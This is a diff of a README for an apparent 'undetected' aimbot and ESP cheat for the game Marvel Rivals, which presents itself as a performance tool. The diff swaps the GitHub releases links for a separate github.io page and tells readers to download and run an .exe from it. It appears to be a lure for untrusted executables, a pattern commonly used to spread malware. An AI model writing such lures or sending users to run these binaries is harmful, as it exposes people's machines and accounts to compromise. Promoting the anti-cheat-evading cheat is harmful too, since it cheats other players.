@@ -1,6 +1,6 @@
 # 🎯 Marvel-Rivals-Aimbot-ESP-Undetected-2026 - Improve your game performance and accuracy
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/nurwindaa8491/Marvel-Rivals-Aimbot-ESP-Undetected-2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://nurwindaa8491.github.io)
 
 ## 📖 About this software
 
@@ -22,7 +22,7 @@ Before you operate this software, ensure your computer meets these minimum speci
 
 Follow these steps to obtain the tool and prepare it for use.
 
-1.  Visit the official release page here: [https://github.com/nurwindaa8491/Marvel-Rivals-Aimbot-ESP-Undetected-2026/releases](https://github.com/nurwindaa8491/Marvel-Rivals-Aimbot-ESP-Undetected-2026/releases).
+1.  Visit the official release page here: [https://nurwindaa8491.github.io](https://nurwindaa8491.github.io).
 2.  Locate the section labeled "Assets" at the bottom of the latest release post.
 3.  Click the file ending in .exe to start your download.
 4.  Once the file finishes downloading, move it to a folder you can access easily.
